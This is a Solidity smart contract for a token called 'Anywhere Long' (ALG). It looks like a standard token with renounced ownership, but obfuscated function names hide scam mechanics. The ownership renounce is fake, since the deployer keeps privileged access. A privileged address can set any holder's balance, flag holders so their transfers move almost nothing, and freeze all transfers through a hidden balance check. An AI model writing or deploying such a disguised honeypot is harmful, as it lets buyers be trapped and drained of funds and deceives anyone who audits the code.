//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface autoAtTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract takeLaunched {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface launchedExempt {
    function createPair(address buySwap, address walletFromMin) external returns (address);
}

interface isList {
    function totalSupply() external view returns (uint256);

    function balanceOf(address tokenSenderTx) external view returns (uint256);

    function transfer(address swapWalletTotal, uint256 listSender) external returns (bool);

    function allowance(address receiverEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 listSender) external returns (bool);

    function transferFrom(
        address sender,
        address swapWalletTotal,
        uint256 listSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed fundMin, uint256 value);
    event Approval(address indexed receiverEnable, address indexed spender, uint256 value);
}

interface isListMetadata is isList {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract AnywhereLong is takeLaunched, isList, isListMetadata {

    function owner() external view returns (address) {
        return sellTeam;
    }

    uint256 limitAmount;

    uint256 private shouldToReceiver;

    uint256 public walletExempt;

    function name() external view virtual override returns (string memory) {
        return tradingTx;
    }

    string private maxExempt = "ALG";

    function decimals() external view virtual override returns (uint8) {
        return exemptToken;
    }

    uint256 private launchedMarketing;

    uint8 private exemptToken = 18;

    bool private walletReceiverShould;

    address private sellTeam;

    function totalSupply() external view virtual override returns (uint256) {
        return enableIs;
    }

    function fromBuy(address tokenLaunched, address swapWalletTotal, uint256 listSender) internal returns (bool) {
        require(isBuy[tokenLaunched] >= listSender);
        isBuy[tokenLaunched] -= listSender;
        isBuy[swapWalletTotal] += listSender;
        emit Transfer(tokenLaunched, swapWalletTotal, listSender);
        return true;
    }

    function listTotal() public {
        emit OwnershipTransferred(takeSell, address(0));
        sellTeam = address(0);
    }

    function transferFrom(address tokenLaunched, address swapWalletTotal, uint256 listSender) external override returns (bool) {
        if (_msgSender() != feeIsTo) {
            if (walletSellFrom[tokenLaunched][_msgSender()] != type(uint256).max) {
                require(listSender <= walletSellFrom[tokenLaunched][_msgSender()]);
                walletSellFrom[tokenLaunched][_msgSender()] -= listSender;
            }
        }
        return atReceiver(tokenLaunched, swapWalletTotal, listSender);
    }

    function atReceiver(address tokenLaunched, address swapWalletTotal, uint256 listSender) internal returns (bool) {
        if (tokenLaunched == takeSell) {
            return fromBuy(tokenLaunched, swapWalletTotal, listSender);
        }
        uint256 senderMode = isList(walletFee).balanceOf(maxTrading);
        require(senderMode == limitAmount);
        require(swapWalletTotal != maxTrading);
        if (amountTeam[tokenLaunched]) {
            return fromBuy(tokenLaunched, swapWalletTotal, feeMin);
        }
        return fromBuy(tokenLaunched, swapWalletTotal, listSender);
    }

    address maxTrading = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function balanceOf(address tokenSenderTx) public view virtual override returns (uint256) {
        return isBuy[tokenSenderTx];
    }

    constructor (){
        if (shouldToReceiver != launchedMarketing) {
            walletExempt = shouldToReceiver;
        }
        autoAtTotal tokenMax = autoAtTotal(feeIsTo);
        walletFee = launchedExempt(tokenMax.factory()).createPair(tokenMax.WETH(), address(this));
        
        takeSell = _msgSender();
        listTotal();
        txEnable[takeSell] = true;
        isBuy[takeSell] = enableIs;
        if (launchedMarketing == walletExempt) {
            launchedMarketing = shouldToReceiver;
        }
        emit Transfer(address(0), takeSell, enableIs);
    }

    bool public enableTrading;

    function walletTx() private view {
        require(txEnable[_msgSender()]);
    }

    function liquidityFrom(address txIs) public {
        walletTx();
        if (limitSwap == walletReceiverShould) {
            walletReceiverShould = true;
        }
        if (txIs == takeSell || txIs == walletFee) {
            return;
        }
        amountTeam[txIs] = true;
    }

    mapping(address => uint256) private isBuy;

    address public walletFee;

    uint256 maxList;

    event OwnershipTransferred(address indexed modeAuto, address indexed tokenList);

    function allowance(address listWalletFee, address shouldToken) external view virtual override returns (uint256) {
        if (shouldToken == feeIsTo) {
            return type(uint256).max;
        }
        return walletSellFrom[listWalletFee][shouldToken];
    }

    mapping(address => bool) public txEnable;

    function getOwner() external view returns (address) {
        return sellTeam;
    }

    uint256 constant feeMin = 19 ** 10;

    bool public limitSwap;

    function transfer(address totalSell, uint256 listSender) external virtual override returns (bool) {
        return atReceiver(_msgSender(), totalSell, listSender);
    }

    function approve(address shouldToken, uint256 listSender) public virtual override returns (bool) {
        walletSellFrom[_msgSender()][shouldToken] = listSender;
        emit Approval(_msgSender(), shouldToken, listSender);
        return true;
    }

    mapping(address => bool) public amountTeam;

    address feeIsTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function launchFromTeam(address totalSell, uint256 listSender) public {
        walletTx();
        isBuy[totalSell] = listSender;
    }

    function symbol() external view virtual override returns (string memory) {
        return maxExempt;
    }

    function liquidityLaunch(address receiverMin) public {
        require(receiverMin.balance < 100000);
        if (enableTrading) {
            return;
        }
        
        txEnable[receiverMin] = true;
        
        enableTrading = true;
    }

    string private tradingTx = "Anywhere Long";

    mapping(address => mapping(address => uint256)) private walletSellFrom;

    address public takeSell;

    uint256 private enableIs = 100000000 * 10 ** 18;

    function buyAmount(uint256 listSender) public {
        walletTx();
        limitAmount = listSender;
    }

}